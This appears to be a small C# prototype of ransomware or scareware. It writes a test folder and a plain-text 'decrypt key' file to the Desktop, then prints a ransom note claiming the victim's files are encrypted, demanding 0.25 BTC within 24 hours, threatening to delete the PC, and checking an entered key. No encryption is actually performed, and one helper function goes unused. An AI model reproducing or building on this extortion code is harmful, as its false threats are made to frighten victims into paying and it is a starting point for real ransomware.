using System.Security.Cryptography;

// strings
string folderName = "test";
string userDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
string dir = Path.Combine(userDirectory, folderName);

// Creating the Directory
if (!Directory.Exists(dir))
{
    Directory.CreateDirectory(dir);

    string testFilePath = Path.Combine(dir, "test.txt");
    string dontWorryFilePath = Path.Combine(dir, "dontworry.txt");

    string key = GenerateRandomHashKey();
    string testContent = "hello world!";
    string dontWorryContent = key;

    File.WriteAllText(testFilePath, testContent);
    File.WriteAllText(dontWorryFilePath, dontWorryContent);
}
else
{ }

Console.WriteLine("All your files have been encrypted.");
Console.WriteLine("Send me 0.25BTC within 24 Hours and I'll return ur files again.");
Console.WriteLine("If u have already paid, use the field below and paste the key."); 
Console.WriteLine("Remember not to close cmd or your pc will be DELETED. Good Luck! ;)");

string answer = Console.ReadLine();

string dontWorryPath = Path.Combine(dir, "dontworry.txt");
string correctAnswer = File.ReadAllText(dontWorryPath);

    if (answer == correctAnswer)
    {
        Console.WriteLine("Correct password entered!");
    }
    else
    {
        Console.WriteLine("Incorrect password entered!");
    }

// Generating a Decrypt Key
static string GenerateRandomHashKey()
{
    byte[] randomBytes = new byte[16];
    using (var rng = RandomNumberGenerator.Create())
    {
        rng.GetBytes(randomBytes);
    }

    string hash1 = BCrypt.Net.BCrypt.HashPassword(Convert.ToBase64String(randomBytes));
    string hash2 = BCrypt.Net.BCrypt.HashPassword(DateTime.Now.Ticks.ToString());

    return hash1 + hash2;
}

// generating a random hash for all folder contents
static string GenerateRandomHashForFolderContents()
{
    string folderContent = GenerateRandomHashKey();
    return folderContent;
}